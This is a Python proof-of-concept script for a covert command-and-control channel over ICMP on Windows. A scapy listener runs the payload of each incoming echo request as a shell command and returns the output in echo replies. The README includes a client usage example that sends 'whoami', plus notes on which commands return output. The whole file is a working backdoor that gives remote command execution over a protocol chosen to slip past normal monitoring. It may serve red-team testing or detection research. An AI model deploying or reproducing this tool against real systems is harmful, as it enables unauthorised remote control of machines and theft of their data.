#receiver windows
#!/usr/bin/python
import sys, os
from scapy.all import *
from subprocess import check_output

#showing interfaces in windows
"""
README/USAGE:
This is a simple PoC for sending basic C2 over ICMP echo/replies via 'bind' equivalent
The listener has been tuned to use Python 3.x udner Windows within 64 bit python default settings
Ensure that you do a 'pip install scapy' prior to using the script
Modify the sniff listener 'iface=' to be whichever interface you use
In windows, you can find this under show_interfaces() illustrated below:
>> show_interfaces()
INDEX  IFACE                                           IP               MAC
13     Intel(R) Dual Band Wireless-AC 8265             172.20.20.20     IntelCor:11:22:00
<Client Usage Example>:
Run scapy interactive (aka start > run > cmd.exe > scapy)
command = "whoami"
sendpkt = IP(src="10.10.10.10", dst="20.20.20.20")/ICMP(type=8)/Raw(load=command)
ans, unans = sr(sendpkt, timeout=2)
ans[0]

NOTE: 
Any expected return payload seems to not work well with multi-line returns
that begin with a blank/line carriage. popen() will continue on exceptions
while check_output will raise a stop error and shut the comms. Also in testing
even with a valid return of check_output in your variable, windows interfaces
possibly due to scapy or the windows stack itself won't send overly long output
even when properly fragmented. I decided against creating an actual easy to use
select interface feature and easy to use client due to the varying limitations
on windows 10 testing.


Example findings with this base code:
whoami - returns in icmp response pkt
hostname - returns in icmp response pkt
ipconfig - Returns only a new line in response pkt and '\n' errors in the listening console screen
ping foo.com - Returns empty in response pkt with payload on the listening console screen
===============================================================================================
This software provides no expressed warranty or liability for use and is licensed under GPLv2
Dennis Chow dchow[AT]xtecsystems.com
www.scissecurity.com
===============================================================================================
"""

#Nested Function using Scapy to Parse Input and Respond
def shellfoo(pkt):
	#scapy uses pythons raw string vs. regular string
	if Raw in pkt[ICMP]:
		#keep original pkt values
		src = pkt[IP].src
		dst = pkt[IP].dst
		id = pkt[ICMP].id
		seq = pkt[ICMP].seq
		cmd = pkt[ICMP].payload
		#execute shell command nested function
		def shellcmd(input):
			#cheater way to strip out scapys raw string
			strcmd = str(cmd).replace('b\'', '').replace('\n', '').replace('\\\\', '\\').rstrip('\x00').rstrip('\'')
			print("Printing scrubbed command entered: ")
			print(strcmd)
			#return os.system(strcmd) #(dont use only returns std out on console)
			return os.popen(strcmd).readline()
			#return check_output([strcmd], shell=True) #abs path required and an exception blocking function
		
		retsh = shellcmd(cmd)
		#resp = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/str(retsh)
		resp = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/Raw(load=retsh)
		print("printing shell cmd output:")
		print(resp[Raw])
		
		#frag the packet for large shell returns like dir and ipconfig
		frags = fragment(resp, 1460)
		x = 0 #counter
		for i in frags:
			x = x+1
			print("Sending packet " + str(x))
			send(resp)
		#send(resp)

#BPF filter for icmp only up to 10 packet count
sniff(iface="Realtek PCIe GBE Family Controller", prn=shellfoo, filter="icmp", count=10)
